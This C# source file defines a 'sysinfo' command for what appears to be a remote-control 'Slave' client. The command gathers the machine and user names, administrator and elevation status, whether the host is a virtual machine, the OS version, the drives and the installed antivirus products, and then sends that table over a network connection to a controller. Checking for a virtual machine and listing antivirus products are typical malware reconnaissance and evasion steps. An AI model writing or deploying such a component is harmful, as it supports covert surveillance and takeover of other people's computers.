using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Slave.Commands
{
    internal class SysInfo : ICommand
    {
        public string name { get; } = "sysinfo";

        public void Process(List<string> args)
        {
            var infos = new List<Tuple<string, string>>
            {
                new Tuple<string, string>("Machine name", Environment.MachineName),
                new Tuple<string, string>("Virtual machine", IsVirtualMachine() ? "Yes" : "No"),
                new Tuple<string, string>("Current user's name", Environment.UserName),
                new Tuple<string, string>("Current user's domain name", Environment.UserDomainName),
                new Tuple<string, string>("Current user is administrator", IsAdministrator().ToString()),
                new Tuple<string, string>("Running as admin", RuningAsAdmin().ToString()),
                new Tuple<string, string>("Os version", $"{Environment.OSVersion} , {(Environment.Is64BitOperatingSystem ? "64" : "32")}bit operating system"),
                new Tuple<string, string>(".NET version", Environment.Version.ToString()),
                new Tuple<string, string>("Processor cores", Environment.ProcessorCount.ToString()),
                new Tuple<string, string>("Machine uptime", TimespanAsString(TimeSpan.FromMilliseconds(Environment.TickCount))),
                new Tuple<string, string>("Drives", Environment.GetLogicalDrives().Aggregate((current, drive) => $"{current} , {drive}")),
                new Tuple<string, string>("Antivirus", GetInstalledAntivirus().Aggregate((current, av) => $"{current} , {av}"))
            };

            SlaveCommandsManager.networkManager.WriteLine(SlaveCommandsManager.TableDisplay(infos));
            SlaveCommandsManager.networkManager.WriteLine("{end}");
        }

        string TimespanAsString(TimeSpan t)
        {
            string result;

            if (t.TotalMinutes < 1.0)
            {
                result = $"{t.Seconds}s";
            }
            else if (t.TotalHours < 1.0)
            {
                result = $"{t.Minutes}m:{t.Seconds:D2}s";
            }
            else
            {
                result = $"{(int)t.TotalHours}h:{t.Minutes:D2}m:{t.Seconds:D2}s";
            }

            return result;
        }

        public bool IsVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        var manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        /// <summary>
        /// Check if the current user is an administrator.
        /// Taken from http://www.davidmoore.info/2011/06/20/how-to-check-if-the-current-user-is-an-administrator-even-if-uac-is-on/
        /// </summary>
        /// <returns>Is admin ?</returns>
        public bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return true;
            }

            if (Environment.OSVersion.Platform != PlatformID.Win32NT || Environment.OSVersion.Version.Major < 6)
            {
                // Operating system does not support UAC; skipping elevation check.
                return false;
            }

            var tokenInfLength = Marshal.SizeOf(typeof(int));
            IntPtr tokenInformation = Marshal.AllocHGlobal(tokenInfLength);

            try
            {
                var token = identity.Token;
                var result = GetTokenInformation(token, TokenInformationClass.TokenElevationType, tokenInformation, tokenInfLength, out tokenInfLength);

                if (!result)
                {
                    var exception = Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());
                    throw new InvalidOperationException("Couldn't get token information", exception);
                }

                var elevationType = (TokenElevationType)Marshal.ReadInt32(tokenInformation);

                switch (elevationType)
                {
                    case TokenElevationType.TokenElevationTypeDefault:
                        // TokenElevationTypeDefault - User is not using a split token, so they cannot elevate.
                        return false;
                    case TokenElevationType.TokenElevationTypeFull:
                        // TokenElevationTypeFull - User has a split token, and the process is running elevated. Assuming they're an administrator.
                        return true;
                    case TokenElevationType.TokenElevationTypeLimited:
                        // TokenElevationTypeLimited - User has a split token, but the process is not running elevated. Assuming they're an administrator.
                        return true;
                    default:
                        // Unknown token elevation type.
                        return false;
                }
            }
            finally
            {
                if (tokenInformation != IntPtr.Zero) Marshal.FreeHGlobal(tokenInformation);
            }
        }

        public bool RuningAsAdmin()
        {
            try
            {
                return WindowsIdentity.GetCurrent().Owner
                    .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
            catch (NullReferenceException)
            {
                return false;
            }
        }
        
        public IEnumerable<string> GetInstalledAntivirus()
        {
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
            ManagementObjectCollection instances = searcher.Get();
            foreach (var instance in instances)
            {
                yield return instance.GetPropertyValue("displayName").ToString();
            }
        }

        #region WinAPI

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr tokenHandle, TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);

        /// <summary>
        /// Passed to <see cref="GetTokenInformation"/> to specify what
        /// information about the token to return.
        /// </summary>
        enum TokenInformationClass
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUiAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        /// <summary>
        /// The elevation type for a user token.
        /// </summary>
        enum TokenElevationType
        {
            TokenElevationTypeDefault = 1,
            TokenElevationTypeFull,
            TokenElevationTypeLimited
        }

        #endregion WinAPI
    }
}
